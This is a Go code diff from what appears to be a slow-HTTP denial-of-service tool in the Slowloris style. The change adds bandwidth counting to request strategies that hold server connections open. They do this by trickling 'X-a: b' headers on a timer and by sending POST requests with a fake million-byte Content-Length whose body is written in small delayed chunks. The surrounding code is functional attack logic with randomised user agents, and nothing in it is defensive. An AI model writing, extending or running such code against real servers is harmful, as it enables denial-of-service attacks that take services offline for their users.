@@ -13,42 +13,44 @@ import (
 )
 
 type RequestStrategy interface {
-	SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error
+	SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) (uint64, error)
 }
 
 type GetRequestStrategy struct{}
 
-func (s *GetRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error {
+func (s *GetRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) (uint64, error) {
 	userAgent := common.GetRandomUserAgent()
 	requestHeaders := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", urlObj.RequestURI(), urlObj.Hostname(), userAgent)
-	_, err := conn.Write([]byte(requestHeaders))
+	n, err := conn.Write([]byte(requestHeaders))
 	// Additional header writes with delays...
-	return err
+	return uint64(n), err
 }
 
 type PostRequestStrategy struct {
 	Body string
 }
 
-func (s *PostRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error {
+func (s *PostRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) (uint64, error) {
 	userAgent := common.GetRandomUserAgent()
 	fakeContentLength := 1000000 // A much larger content length
 	requestHeaders := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\n\r\n", urlObj.RequestURI(), urlObj.Hostname(), userAgent, fakeContentLength)
-	_, err := conn.Write([]byte(requestHeaders))
+	n, err := conn.Write([]byte(requestHeaders))
 	if err != nil {
-		return err
+		return uint64(n), err
 	}
 
+	totalBytes := uint64(n)
 	// Write the actual POST data slowly
 	for _, chunk := range splitIntoChunks(s.Body, 10) { // Split the body into chunks
-		_, err = conn.Write([]byte(chunk))
+		n, err = conn.Write([]byte(chunk))
 		if err != nil {
-			return err
+			return totalBytes, err
 		}
+		totalBytes += uint64(n)
 		time.Sleep(delay)
 	}
 
-	return nil
+	return totalBytes, nil
 }
 
 // splitIntoChunks splits the string into chunks of the specified size.
@@ -118,10 +120,11 @@ func (rm *RequestManager) SendSlowRequest(wg *sync.WaitGroup, urlObj *url.URL, d
 	defer conn.Close()
 
 	// Send the initial part of the request using the strategy pattern
-	err = rm.strategy.SendRequest(conn, urlObj, rm.rand, delay)
+	bytesSent, err := rm.strategy.SendRequest(conn, urlObj, rm.rand, delay)
 	if err != nil {
 		return
 	}
+	rm.statusManager.IncrementTotalBandwidth(bytesSent)
 
 	// Continuously send headers at intervals to keep the connection open
 	ticker := time.NewTicker(delay)
@@ -129,9 +132,10 @@ func (rm *RequestManager) SendSlowRequest(wg *sync.WaitGroup, urlObj *url.URL, d
 
 	for range ticker.C {
 		// Send a keep-alive part of the request
-		_, err := conn.Write([]byte("X-a: b\r\n"))
+		n, err := conn.Write([]byte("X-a: b\r\n"))
 		if err != nil {
 			return
 		}
+		rm.statusManager.IncrementTotalBandwidth(uint64(n))
 	}
 }
